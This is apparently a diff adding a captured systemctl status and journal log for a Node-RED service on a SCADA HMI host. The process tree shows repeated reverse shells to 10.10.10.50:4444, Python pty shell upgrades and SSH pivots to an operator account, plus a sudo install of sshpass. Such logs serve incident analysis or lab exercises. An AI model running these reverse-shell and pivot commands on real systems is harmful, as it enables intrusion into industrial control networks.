@@ -1,0 +1,35 @@
+● nodered.service - Node-RED Graphical Flow-builder
+     Loaded: loaded (/etc/systemd/system/nodered.service; enabled; preset: enabled)
+     Active: active (running) since Tue 2026-06-30 13:06:21 UTC; 1h 6min ago
+   Main PID: 12439 (node-red)
+      Tasks: 26 (limit: 2348)
+     Memory: 130.9M
+        CPU: 3.714s
+     CGroup: /system.slice/nodered.service
+             ├─12439 node-red
+             ├─13237 bash -c "bash -i >& /dev/tcp/10.10.10.50/4444 0>&1"
+             ├─13238 bash -i
+             ├─13239 python3 -c "import pty; pty.spawn(\"/bin/bash\")"
+             ├─13240 /bin/bash
+             ├─13242 ssh operator@192.168.20.20
+             ├─13247 bash -c "bash -i >& /dev/tcp/10.10.10.50/4444 0>&1"
+             ├─13248 bash -i
+             ├─13251 python3 -c "import pty; pty.spawn(\"/bin/bash\")"
+             ├─13252 /bin/bash
+             ├─13253 ssh operator@192.168.20.20
+             ├─13266 bash -c "bash -i >& /dev/tcp/10.10.10.50/4444 0>&1"
+             ├─13267 bash -i
+             ├─13268 python3 -c "import pty; pty.spawn(\"/bin/bash\")"
+             ├─13269 /bin/bash
+             └─13270 ssh operator@192.168.20.20
+
+Jun 30 13:22:51 scada-hmi env[12439]: 30 Jun 13:22:51 - [info] Starting flows
+Jun 30 13:22:51 scada-hmi env[12439]: 30 Jun 13:22:51 - [info] Started flows
+Jun 30 13:22:53 scada-hmi sudo[13232]:     root : PWD=/root ; USER=root ; COMMAND=/usr/bin/apt-get install sshpass -y
+Jun 30 13:22:53 scada-hmi sudo[13232]: pam_unix(sudo:session): session opened for user root(uid=0) by (uid=0)
+Jun 30 13:22:54 scada-hmi sudo[13232]: pam_unix(sudo:session): session closed for user root
+Jun 30 13:26:12 scada-hmi env[12439]: 30 Jun 13:26:12 - [info] Stopping flows
+Jun 30 13:26:12 scada-hmi env[12439]: 30 Jun 13:26:12 - [info] Stopped flows
+Jun 30 13:26:12 scada-hmi env[12439]: 30 Jun 13:26:12 - [info] Updated flows
+Jun 30 13:26:12 scada-hmi env[12439]: 30 Jun 13:26:12 - [info] Starting flows
+Jun 30 13:26:12 scada-hmi env[12439]: 30 Jun 13:26:12 - [info] Started flows
